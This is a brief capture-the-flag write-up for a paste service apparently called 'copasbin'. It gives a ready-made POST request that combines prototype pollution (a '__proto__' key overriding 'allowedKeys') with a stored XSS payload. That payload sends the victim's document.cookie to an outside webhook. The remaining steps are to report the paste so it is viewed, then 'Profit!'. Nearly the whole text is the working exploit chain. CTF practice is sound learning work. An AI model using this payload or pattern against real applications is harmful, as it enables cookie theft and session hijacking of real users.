# Writeup copasbin

1. Create copas to pollute prototype and allow XSS payload

```
POST /api/copas

{
    "data": "<img src=\"a\" onerror=\"fetch('https://<webhook-url>?cookies=' + document.cookie)\">",
    "__proto__": {
        "allowedKeys": ["data"]
    }
}
```

2. Report copas

3. Profit!
